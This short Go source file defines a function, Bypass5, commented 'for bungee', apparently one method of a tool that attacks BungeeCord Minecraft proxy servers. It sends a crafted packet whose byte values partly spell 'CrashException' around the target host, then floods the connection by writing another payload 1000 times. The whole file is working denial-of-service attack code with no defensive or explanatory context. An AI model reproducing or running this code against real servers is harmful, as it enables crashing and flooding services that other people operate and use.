package methods

import (
	"fmt"
	"net"
)

// Bypass5 is for bungee
func Bypass5(data *Data, out net.Conn) bool {
	if data.bytes == nil {
		data.supplyBytes(makeBytes(0, 14, 67, 114, data.Host, 97, 115, 104, 69, 120, 99, 101, 112, 116, 105, 111, 110))
	}

	_, err := out.Write(data.bytes)

	if err != nil {
		return true
	}

	fmt.Println("sent")

	for n := 0; n < 1000; n++ {
		out.Write(data.minorBytes)
	}

	return false
}
